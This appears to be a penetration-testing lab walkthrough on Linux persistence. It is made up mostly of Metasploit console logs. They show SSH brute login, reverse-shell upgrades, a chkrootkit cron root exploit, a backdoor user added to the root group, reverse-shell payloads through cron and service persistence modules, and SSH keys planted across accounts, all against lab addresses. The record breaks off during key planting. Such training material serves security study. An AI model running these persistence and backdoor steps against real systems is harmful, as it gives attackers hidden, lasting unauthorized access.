- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
- Gaining an initial foothold is not enough, you need to setup and maintain persistence access to your targets
- The persistence techniques we can utilize will depend on the target configuration
- We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
        RX packets 124  bytes 11038 (10.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 107  bytes 343753 (335.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.199.49.2  netmask 255.255.255.0  broadcast 192.199.49.255
        ether 02:42:c0:c7:31:02  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1486 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: When in a module, use back to go back to the top level prompt

msf5 > workspace -a LinuxPersistence
[*] Added workspace: LinuxPersistence
[*] Workspace: LinuxPersistence
msf5 > setg rhosts 192.199.49.3
rhosts => 192.199.49.3
msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set username jackie
username => jackie
msf5 auxiliary(scanner/ssh/ssh_login) > set password password
password => password
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.199.49.3:22 - Success: 'jackie:password' ''
[*] Command shell session 1 opened (192.199.49.2:35169 -> 192.199.49.3:22) at 2023-08-08 17:38:16 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                            Connection
  --  ----  ----           -----------                            ----------
  1         shell unknown  SSH jackie:password (192.199.49.3:22)  192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)

msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.199.49.2:4433 
[*] Sending stage (980808 bytes) to 192.199.49.3
[*] Meterpreter session 2 opened (192.199.49.2:4433 -> 192.199.49.3:57502) at 2023-08-08 17:38:37 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)

msf5 auxiliary(scanner/ssh/ssh_login) > search chkrootkit

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation


msf5 auxiliary(scanner/ssh/ssh_login) > use exploit/unix/local/chkrootkit
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION                           yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > set session 2
session => 2
msf5 exploit(unix/local/chkrootkit) > set chkrootkit /bin/chkrootkit
chkrootkit => /bin/chkrootkit
msf5 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP double handler on 10.1.0.5:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
^C[*] Exploit completed, but no session was created.
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHKROOTKIT  /bin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.5         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > set lhost 192.199.49.2
lhost => 192.199.49.2
msf5 exploit(unix/local/chkrootkit) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)

msf5 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP double handler on 192.199.49.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo x1xWu8JpxqdXpHr6;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "x1xWu8JpxqdXpHr6\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (192.199.49.2:4444 -> 192.199.49.3:47752) at 2023-08-08 17:41:11 +0000
[+] Deleted /tmp/update

ls
flag
cat flag
9db8bf8f483ff50857f26f9bd636bed6
^Z
Background session 3? [y/N]  y
msf5 exploit(unix/local/chkrootkit) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)

msf5 exploit(unix/local/chkrootkit) > sessions -u 3
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.199.49.2:4433 
[*] Sending stage (980808 bytes) to 192.199.49.3
[*] Meterpreter session 4 opened (192.199.49.2:4433 -> 192.199.49.3:38860) at 2023-08-08 17:41:46 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/local/chkrootkit) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 exploit(unix/local/chkrootkit) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer     : 192.199.49.3
OS           : Ubuntu 18.04 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > 
Background session 4? [y/N]  
msf5 exploit(unix/local/chkrootkit) > sessions 4
[*] Starting interaction with 4...

meterpreter > shell
Process 7866 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
root@victim-1:~# useradd -m ftp -s /bin/bash              
useradd -m ftp -s /bin/bash
root@victim-1:~# passwd ftp
passwd ftp
Enter new UNIX password: password123
Retype new UNIX password: password123
passwd: password updated successfully
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
ftp:x:1001:1001::/home/ftp:/bin/bash
root@victim-1:~# groups root
groups root
root : root
root@victim-1:~# usermod -aG root ftp
usermod -aG root ftp
root@victim-1:~# groups ftp
groups ftp
ftp : ftp root
root@victim-1:~#
root@victim-1:~# usermod -u 15 ftp
usermod -u 15 ftp
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
ftp:x:15:1001::/home/ftp:/bin/bash
root@victim-1:~# 
```

```
msf5 exploit(unix/local/chkrootkit) > search platform:linux persistence

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence


msf5 exploit(unix/local/chkrootkit) > use exploit/linux/local/apt_package_manager_persistence
msf5 exploit(linux/local/apt_package_manager_persistence) > options

Module options (exploit/linux/local/apt_package_manager_persistence):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   BACKDOOR_NAME                   no        Name of binary to write
   HOOKNAME                        no        Name of hook file to write
   SESSION                         yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(linux/local/apt_package_manager_persistence) > set session 4
session => 4
msf5 exploit(linux/local/apt_package_manager_persistence) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 exploit(linux/local/apt_package_manager_persistence) > search platform:linux persistence

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence


msf5 exploit(linux/local/apt_package_manager_persistence) > use exploit/linux/local/cron_persistence
msf5 exploit(linux/local/cron_persistence) > options

Module options (exploit/linux/local/cron_persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CLEANUP   true             yes       delete cron entry after execution
   SESSION                    yes       The session to run this module on.
   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
   USERNAME  root             no        User to run cron/crontab as


Exploit target:

   Id  Name
   --  ----
   1   User Crontab


msf5 exploit(linux/local/cron_persistence) > set session 4
session => 4
msf5 exploit(linux/local/cron_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.1.0.5:4444 
[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
[*] Waiting 90sec for execution
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf5 exploit(linux/local/cron_persistence) > options

Module options (exploit/linux/local/cron_persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CLEANUP   true             yes       delete cron entry after execution
   SESSION   4                yes       The session to run this module on.
   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
   USERNAME  root             no        User to run cron/crontab as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.5         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   User Crontab


msf5 exploit(linux/local/cron_persistence) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 exploit(linux/local/cron_persistence) > set lport 4422
lport => 4422
msf5 exploit(linux/local/cron_persistence) > set lhost 192.199.49.2
lhost => 192.199.49.2
msf5 exploit(linux/local/cron_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.199.49.2:4422 
[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
[*] Waiting 90sec for execution
[*] Removing our cron entry from /var/spool/cron/crontabs/root

^C[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/cron_persistence) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 exploit(linux/local/cron_persistence) > use exploit/linux/local/service_persistence
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION                      yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > set session 4
session => 4
msf5 exploit(linux/local/service_persistence) > run

[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > set lhost eth1
lhost => 192.199.49.2
msf5 exploit(linux/local/service_persistence) > set lport 4422
lport => 4422
msf5 exploit(linux/local/service_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.199.49.2:4422 
[*] Utilizing systemd
[*] Utilizing Upstart
[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: 1
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > info

       Name: Service Persistence
     Module: exploit/linux/local/service_persistence
   Platform: Unix, Linux
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 1983-01-01

Provided by:
  h00die <mike@shorebreaksecurity.com>
  Cale Black

Available targets:
  Id  Name
  --  ----
  0   Auto
  1   System V
  2   Upstart
  3   systemd
  4   systemd user

Check supported:
  No

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  SERVICE                      no        Name of service to create
  SESSION     4                yes       The session to run this module on.
  SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
  SHELL_NAME                   no        Name of shell file to write

Payload information:

Description:
  This module will create a service on the box, and mark it for 
  auto-restart. We need enough access to write service files and 
  potentially restart services Targets: System V: CentOS <= 5 Debian 
  <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15 
  Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora 
  >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it 
  dies, only an init change (reboot etc) will restart it.

References:
  https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples

msf5 exploit(linux/local/service_persistence) > set target 3
target => 3
msf5 exploit(linux/local/service_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.199.49.2:4422 
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > set target 4
target => 4
msf5 exploit(linux/local/service_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.199.49.2:4422 
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > 
```

```
msf5 exploit(linux/local/service_persistence) > use post/linux/manage/sshkey_persistence 
msf5 post(linux/manage/sshkey_persistence) > options

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION                                yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

msf5 post(linux/manage/sshkey_persistence) > info

       Name: SSH Key Persistence
     Module: post/linux/manage/sshkey_persistence
   Platform: Linux
       Arch: 
       Rank: Excellent

Provided by:
  h00die <mike@shorebreaksecurity.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name             Current Setting       Required  Description
  ----             ---------------       --------  -----------
  CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
  PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
  SESSION                                yes       The session to run this module on.
  SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
  USERNAME                               no        User to add SSH key to (Default: all users on box)

Description:
  This module will add an SSH key to a specified user (or all), to 
  allow remote login via SSH at any time.

msf5 post(linux/manage/sshkey_persistence) > set createsshfolder true 
createsshfolder => true
msf5 post(linux/manage/sshkey_persistence) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 post(linux/manage/sshkey_persistence) > set session 4
session => 4
msf5 post(linux/manage/sshkey_persistence) > run

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[*] Creating /bin/.ssh folder
[*] Creating /dev/.ssh folder
[*] Creating /home/ftp/.ssh folder
[*] Creating /home/ftp
/.ssh folder
[*] Creating /home/jackie/.ssh folder
[*] Creating /nonexistent/.ssh folder
[*] Creating /root/.ssh folder
[*] Creating /run/sshd/.ssh folder
[*] Creating /run/systemd/netif/.ssh folder
[*] Creating /run/systemd/resolve/.ssh folder
[*] Creating /usr/games/.ssh folder
[*] Creating /usr/sbin/.ssh folder
[*] Creating /var/backups/.ssh folder
[*] Creating /var/cache/man/.ssh folder
[*] Creating /var/lib/gnats/.ssh folder
[*] Creating /var/list/.ssh folder
[*] Creating /var/mail/.ssh folder
[*] Creating /var/run/ircd/.ssh folder
[*] Creating /var/spool/lpd/.ssh folder
[*] Creating /var/spool/news/.ssh folder
[*] Creating /var/spool/uucp/.ssh folder
[*] Creating /var/www/.ssh folder
[+] Storing new private key as /root/.msf4/loot/20230808180854_LinuxPersistence_192.199.49.3_id_rsa_100348.txt
[*] Adding key to /bin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /dev/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/ftp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/jackie/.ssh/authorized_keys
